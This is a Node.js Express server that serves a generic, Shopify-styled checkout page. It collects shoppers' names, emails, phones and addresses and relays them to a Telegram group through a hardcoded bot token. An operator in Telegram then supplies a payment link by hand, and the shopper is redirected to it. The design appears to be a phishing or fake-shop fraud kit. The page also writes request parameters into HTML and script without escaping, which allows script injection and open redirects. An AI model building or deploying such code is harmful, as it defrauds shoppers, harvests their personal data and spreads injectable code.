require('dotenv').config();
const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

// Telegram credentials
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8514021592:AAGb8cpda9C03BYreg6kVL5zvUMyAk-FGMM';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-5088156392';
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
const APP_URL = process.env.APP_URL || `http://localhost:${PORT}`;

// In-memory storage voor sessions
const pendingSessions = new Map();

// Test endpoint
app.get('/', (req, res) => {
  res.json({ 
    status: 'active',
    message: 'Telegram Checkout Gateway is running',
    timestamp: new Date().toISOString()
  });
});

// Health check
app.get('/health', (req, res) => {
  res.json({ status: 'healthy' });
});

// Send message to Telegram
async function sendTelegramMessage(text) {
  try {
    const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: text,
      parse_mode: 'HTML'
    });
    return response.data;
  } catch (error) {
    console.error('Error sending Telegram message:', error.message);
    throw error;
  }
}

// Checkout pagina (Shopify style)
app.get('/checkout', async (req, res) => {
  const { amount, currency, order_id, return_url, cart_items } = req.query;
  
  if (!amount || !currency) {
    return res.status(400).send('Missing required parameters');
  }

  let cartData = null;
  if (cart_items) {
    try {
      cartData = JSON.parse(decodeURIComponent(cart_items));
    } catch (e) {
      console.error('Error parsing cart_items:', e);
    }
  }

  const sessionId = Date.now().toString();

  // Build cart items HTML
  let cartItemsHtml = '';
  if (cartData && cartData.items) {
    cartItemsHtml = cartData.items.map(item => `
      <div class="product-summary">
        <div class="product-info">
          <span class="product-quantity">${item.quantity}</span>
          <span class="product-title">${item.title}</span>
        </div>
        <span class="product-price">€${(item.price / 100).toFixed(2)}</span>
      </div>
    `).join('');
  }

  res.send(`
    <!DOCTYPE html>
    <html lang="en">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Checkout - €${amount}</title>
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
        <style>
          * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
          }
          
          body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: #fafafa;
            color: #202223;
            line-height: 1.6;
          }
          
          .container {
            max-width: 1200px;
            margin: 0 auto;
            display: grid;
            grid-template-columns: 1fr 1fr;
            min-height: 100vh;
          }
          
          @media (max-width: 768px) {
            .container {
              grid-template-columns: 1fr;
            }
            .order-summary {
              order: -1;
            }
          }
          
          /* Left side - Form */
          .checkout-form {
            padding: 60px 80px;
            background: white;
          }
          
          @media (max-width: 768px) {
            .checkout-form {
              padding: 30px 20px;
            }
          }
          
          .logo {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 40px;
            color: #202223;
          }
          
          .breadcrumb {
            display: flex;
            gap: 8px;
            font-size: 13px;
            color: #6d7175;
            margin-bottom: 30px;
          }
          
          .breadcrumb a {
            color: #2c6ecb;
            text-decoration: none;
          }
          
          .breadcrumb span {
            color: #6d7175;
          }
          
          h1 {
            font-size: 26px;
            font-weight: 600;
            margin-bottom: 24px;
            color: #202223;
          }
          
          .section {
            margin-bottom: 32px;
          }
          
          .section-title {
            font-size: 14px;
            font-weight: 600;
            color: #202223;
            margin-bottom: 16px;
          }
          
          .form-group {
            margin-bottom: 16px;
          }
          
          label {
            display: block;
            font-size: 13px;
            font-weight: 500;
            color: #202223;
            margin-bottom: 8px;
          }
          
          input {
            width: 100%;
            padding: 11px 12px;
            border: 1px solid #c9cccf;
            border-radius: 5px;
            font-size: 14px;
            font-family: inherit;
            transition: border-color 0.2s, box-shadow 0.2s;
          }
          
          input:hover {
            border-color: #8c9196;
          }
          
          input:focus {
            outline: none;
            border-color: #2c6ecb;
            box-shadow: 0 0 0 3px rgba(44, 110, 203, 0.15);
          }
          
          input::placeholder {
            color: #8c9196;
          }
          
          .form-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 16px;
          }
          
          .form-row-thirds {
            display: grid;
            grid-template-columns: 2fr 1fr;
            gap: 16px;
          }
          
          @media (max-width: 480px) {
            .form-row, .form-row-thirds {
              grid-template-columns: 1fr;
            }
          }
          
          .submit-button {
            width: 100%;
            padding: 16px 24px;
            background: #2c6ecb;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 24px;
          }
          
          .submit-button:hover {
            background: #1f5bb5;
          }
          
          .submit-button:disabled {
            background: #c9cccf;
            cursor: not-allowed;
          }
          
          /* Right side - Order Summary */
          .order-summary {
            padding: 60px 80px;
            background: #fafafa;
            border-left: 1px solid #e1e3e5;
          }
          
          @media (max-width: 768px) {
            .order-summary {
              padding: 30px 20px;
              border-left: none;
              border-bottom: 1px solid #e1e3e5;
            }
          }
          
          .product-summary {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 16px 0;
            border-bottom: 1px solid #e1e3e5;
          }
          
          .product-info {
            display: flex;
            align-items: center;
            gap: 12px;
          }
          
          .product-quantity {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 20px;
            height: 20px;
            background: #c9cccf;
            color: white;
            border-radius: 50%;
            font-size: 12px;
            font-weight: 600;
          }
          
          .product-title {
            font-size: 14px;
            color: #202223;
          }
          
          .product-price {
            font-size: 14px;
            font-weight: 500;
            color: #202223;
          }
          
          .summary-line {
            display: flex;
            justify-content: space-between;
            padding: 12px 0;
            font-size: 14px;
          }
          
          .summary-line.total {
            border-top: 1px solid #e1e3e5;
            padding-top: 16px;
            margin-top: 16px;
            font-size: 16px;
            font-weight: 600;
          }
          
          .waiting {
            text-align: center;
            padding: 60px 20px;
            display: none;
          }
          
          .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #2c6ecb;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
          }
          
          @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
          }
          
          .waiting-text {
            font-size: 16px;
            color: #6d7175;
          }
          
          .error {
            background: #fef1f1;
            border: 1px solid #d72c0d;
            color: #d72c0d;
            padding: 12px 16px;
            border-radius: 5px;
            margin-bottom: 20px;
            font-size: 14px;
            display: none;
          }
        </style>
      </head>
      <body>
        <div class="container">
          <!-- Left side - Form -->
          <div class="checkout-form">
            <div id="form-container">
              <div class="logo">Your Store</div>
              
              <div class="breadcrumb">
                <a href="${return_url || '/'}">Cart</a>
                <span>›</span>
                <span>Information</span>
                <span>›</span>
                <span style="color: #c9cccf;">Payment</span>
              </div>
              
              <h1>Contact</h1>
              
              <div id="error-message" class="error"></div>
              
              <form id="customer-form">
                <div class="section">
                  <div class="form-group">
                    <label for="email">Email</label>
                    <input 
                      type="email" 
                      id="email" 
                      placeholder="Email"
                      autocomplete="email"
                      required
                    >
                  </div>
                </div>
                
                <div class="section">
                  <div class="section-title">Delivery</div>
                  
                  <div class="form-row">
                    <div class="form-group">
                      <label for="firstName">First name</label>
                      <input 
                        type="text" 
                        id="firstName" 
                        placeholder="First name"
                        autocomplete="given-name"
                        required
                      >
                    </div>
                    <div class="form-group">
                      <label for="lastName">Last name</label>
                      <input 
                        type="text" 
                        id="lastName" 
                        placeholder="Last name"
                        autocomplete="family-name"
                        required
                      >
                    </div>
                  </div>
                  
                  <div class="form-group">
                    <label for="address">Address</label>
                    <input 
                      type="text" 
                      id="address" 
                      placeholder="Address"
                      autocomplete="street-address"
                      required
                    >
                  </div>
                  
                  <div class="form-row-thirds">
                    <div class="form-group">
                      <label for="city">City</label>
                      <input 
                        type="text" 
                        id="city" 
                        placeholder="City"
                        autocomplete="address-level2"
                        required
                      >
                    </div>
                    <div class="form-group">
                      <label for="postalCode">Eircode</label>
                      <input 
                        type="text" 
                        id="postalCode" 
                        placeholder="Eircode"
                        autocomplete="postal-code"
                        required
                      >
                    </div>
                  </div>
                  
                  <div class="form-group">
                    <label for="country">Country/Region</label>
                    <input 
                      type="text" 
                      id="country" 
                      value="Ireland"
                      autocomplete="country"
                      required
                    >
                  </div>
                  
                  <div class="form-group">
                    <label for="phone">Phone</label>
                    <input 
                      type="tel" 
                      id="phone" 
                      placeholder="Phone"
                      autocomplete="tel"
                      required
                    >
                  </div>
                </div>
                
                <button type="submit" class="submit-button">
                  Continue to payment
                </button>
              </form>
            </div>

            <div id="waiting-container" class="waiting">
              <div class="spinner"></div>
              <div class="waiting-text">
                Processing your information...<br>
                Please wait
              </div>
            </div>
          </div>
          
          <!-- Right side - Order Summary -->
          <div class="order-summary">
            <h2 style="font-size: 18px; font-weight: 600; margin-bottom: 24px;">Order summary</h2>
            
            <div class="products">
              ${cartItemsHtml || '<p style="color: #6d7175; font-size: 14px;">No items in cart</p>'}
            </div>
            
            <div style="margin-top: 24px;">
              <div class="summary-line">
                <span style="color: #6d7175;">Subtotal</span>
                <span>€${amount}</span>
              </div>
              <div class="summary-line">
                <span style="color: #6d7175;">Shipping</span>
                <span style="color: #6d7175;">Calculated at next step</span>
              </div>
              <div class="summary-line total">
                <span>Total</span>
                <span style="font-size: 24px;">€${amount}</span>
              </div>
            </div>
          </div>
        </div>

        <script>
          const cartData = ${cartData ? JSON.stringify(cartData) : 'null'};
          const sessionId = '${sessionId}';
          let pollingInterval = null;

          document.getElementById('customer-form').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const customerData = {
              firstName: document.getElementById('firstName').value.trim(),
              lastName: document.getElementById('lastName').value.trim(),
              email: document.getElementById('email').value.trim(),
              phone: document.getElementById('phone').value.trim(),
              address: document.getElementById('address').value.trim(),
              postalCode: document.getElementById('postalCode').value.trim(),
              city: document.getElementById('city').value.trim(),
              country: document.getElementById('country').value.trim()
            };
            
            // Validate
            if (!customerData.firstName || !customerData.lastName || !customerData.email || 
                !customerData.phone || !customerData.address || !customerData.postalCode || 
                !customerData.city || !customerData.country) {
              document.getElementById('error-message').style.display = 'block';
              document.getElementById('error-message').innerHTML = 'Please fill in all required fields';
              return;
            }

            // Show waiting screen
            document.getElementById('form-container').style.display = 'none';
            document.getElementById('waiting-container').style.display = 'block';
            
            try {
              // Send customer data
              const response = await fetch('/api/submit-customer-info', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  sessionId: sessionId,
                  customerData: customerData,
                  cartData: cartData,
                  amount: '${amount}',
                  currency: '${currency}',
                  orderId: '${order_id || ''}',
                  returnUrl: '${return_url || ''}'
                })
              });
              
              const data = await response.json();
              
              if (data.status === 'success') {
                // Start polling for payment link
                startPolling();
              } else {
                throw new Error(data.message || 'Something went wrong');
              }
            } catch (error) {
              document.getElementById('form-container').style.display = 'block';
              document.getElementById('waiting-container').style.display = 'none';
              document.getElementById('error-message').style.display = 'block';
              document.getElementById('error-message').innerHTML = error.message;
            }
          });

          function startPolling() {
            // Poll every 2 seconds for payment link
            pollingInterval = setInterval(async () => {
              try {
                const response = await fetch('/api/check-payment-link/' + sessionId);
                const data = await response.json();
                
                if (data.status === 'ready' && data.paymentLink) {
                  clearInterval(pollingInterval);
                  window.location.href = data.paymentLink;
                }
              } catch (error) {
                console.error('Polling error:', error);
              }
            }, 2000);

            // Stop polling after 10 minutes
            setTimeout(() => {
              if (pollingInterval) {
                clearInterval(pollingInterval);
                document.getElementById('waiting-container').innerHTML = 
                  '<p style="color: #d72c0d;">Request timeout. Please try again.</p>';
              }
            }, 600000);
          }
        </script>
      </body>
    </html>
  `);
});

// Submit customer info
app.post('/api/submit-customer-info', async (req, res) => {
  try {
    const { sessionId, customerData, cartData, amount, currency, orderId, returnUrl } = req.body;
    
    console.log('Customer info received:', customerData);
    
    // Store session
    pendingSessions.set(sessionId, {
      customerData,
      cartData,
      amount,
      currency,
      orderId,
      returnUrl,
      paymentLink: null,
      created_at: new Date()
    });
    
    // Build products list
    let productsText = '';
    if (cartData && cartData.items) {
      productsText = '\n\n<b>🛒 Products:</b>\n';
      cartData.items.forEach(item => {
        productsText += `• ${item.quantity}x ${item.title} - €${(item.price / 100).toFixed(2)}\n`;
      });
    }
    
    // Send to Telegram GROUP
    const message = `
<b>🔔 NEW ORDER</b>

<b>💰 Amount:</b> €${amount}
<b>📦 Order ID:</b> ${orderId || sessionId}

<b>👤 Customer Details:</b>
Name: ${customerData.firstName} ${customerData.lastName}
Email: ${customerData.email}
Phone: ${customerData.phone}
Address: ${customerData.address}
Eircode: ${customerData.postalCode}
City: ${customerData.city}
Country: ${customerData.country}${productsText}

<b>🔑 Session ID:</b> <code>${sessionId}</code>

<b>Send payment link:</b>
<code>/pay ${sessionId} [your-payment-link]</code>

Example:
<code>/pay ${sessionId} https://mollie.com/checkout/xyz123</code>
    `.trim();
    
    await sendTelegramMessage(message);
    
    res.json({
      status: 'success',
      message: 'Details submitted'
    });
    
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({
      status: 'error',
      message: error.message
    });
  }
});

// Check payment link (polling endpoint)
app.get('/api/check-payment-link/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  const session = pendingSessions.get(sessionId);
  
  if (!session) {
    return res.json({ status: 'not_found' });
  }
  
  if (session.paymentLink) {
    return res.json({
      status: 'ready',
      paymentLink: session.paymentLink
    });
  }
  
  res.json({ status: 'waiting' });
});

// Telegram webhook
app.post('/webhook/telegram', async (req, res) => {
  try {
    const update = req.body;
    console.log('Telegram update:', JSON.stringify(update, null, 2));
    
    // Handle text messages
    if (update.message && update.message.text) {
      const text = update.message.text.trim();
      
      // Check if it's a /pay command
      if (text.startsWith('/pay ')) {
        const parts = text.split(' ');
        
        if (parts.length >= 3) {
          const sessionId = parts[1];
          const paymentLink = parts.slice(2).join(' ');
          
          const session = pendingSessions.get(sessionId);
          
          if (session) {
            // Store payment link
            session.paymentLink = paymentLink;
            pendingSessions.set(sessionId, session);
            
            await sendTelegramMessage(`✅ Payment link set for session ${sessionId}\n\nCustomer will be redirected to:\n${paymentLink}`);
          } else {
            await sendTelegramMessage(`❌ Session ${sessionId} not found or expired`);
          }
        } else {
          await sendTelegramMessage(`❌ Usage: /pay [session_id] [payment-link]`);
        }
      }
    }
    
    res.send('OK');
  } catch (error) {
    console.error('Webhook error:', error);
    res.send('OK');
  }
});

// Set webhook
app.get('/set-webhook', async (req, res) => {
  try {
    const webhookUrl = `${APP_URL}/webhook/telegram`;
    const response = await axios.post(`${TELEGRAM_API}/setWebhook`, {
      url: webhookUrl
    });
    
    res.json({
      status: 'success',
      message: 'Webhook set successfully',
      webhook_url: webhookUrl,
      telegram_response: response.data
    });
  } catch (error) {
    res.status(500).json({
      status: 'error',
      message: error.message
    });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📍 App URL: ${APP_URL}`);
  console.log(`🤖 Telegram Bot configured`);
  console.log(`💬 Group Chat ID: ${TELEGRAM_CHAT_ID}`);
  console.log('');
  console.log(`📝 Set webhook: ${APP_URL}/set-webhook`);
});
